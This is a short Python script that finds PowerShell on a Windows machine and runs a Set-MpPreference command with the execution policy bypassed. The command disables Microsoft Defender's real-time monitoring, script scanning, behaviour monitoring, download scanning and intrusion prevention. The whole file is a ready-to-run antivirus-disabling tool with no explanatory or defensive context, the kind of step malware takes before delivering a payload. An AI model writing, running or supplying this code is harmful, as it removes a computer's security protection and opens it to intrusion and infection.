import subprocess
import os
import sys

print("Defender disablage!")

def preliminaryCheck(iter: int | None = 0) -> str:
    if iter == 0:
        os.chdir("C:\\Windows\\System32")
        _ = os.listdir()
        for i in _:
            if i == "powershell.exe":
                return os.path.join(os.getcwd(), i)
        return -1
    elif iter == 1:
        os.chdir("C:\\Windows\\System32\\WindowsPowerShell\\v1.0")
        _ = os.listdir()
        for i in _:
            if i == "powershell.exe":
                return os.path.join(os.getcwd(), i)
        return -2

for i in range(0, 2):
    try:
        testvar = preliminaryCheck(i)
    except Exception as e:
        print(f"Warning: {e}")
    if testvar == -1:
        continue
    if testvar == -2:
        raise SystemExit("No PowerShell has been found!")
    
    # Construct the PowerShell command
    command = f"{testvar} -NoProfile -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true\""
    
    # Execute the PowerShell command
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    # Print the output and error (if any)
    print("Output:", result.stdout)
    print("Error:", result.stderr)
    
    break  # Exit the loop once the command is executed successfully
print("Defender disabledage!")